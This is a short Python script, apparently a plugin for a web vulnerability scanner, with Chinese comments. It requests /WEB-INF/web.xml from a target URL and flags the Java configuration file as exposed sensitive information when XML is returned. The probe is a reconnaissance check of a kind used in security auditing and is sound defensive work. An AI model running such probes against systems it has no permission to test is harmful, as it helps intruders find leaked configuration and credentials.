#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: java配置文件文件发现
referer: unknow
author: Lucifer
description: web.xml是java框架使用的配置文件，可以获取敏感信息
'''
import sys
import requests
import warnings
from termcolor import cprint

class jsp_conf_find_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/WEB-INF/web.xml"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False)
            if "<?xml version" in req.text:
                cprint("[+]存在web.xml配置文件...(敏感信息)\tpayload: "+vulnurl, "green")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = jsp_conf_find_BaseVerify(sys.argv[1])
    testVuln.run()
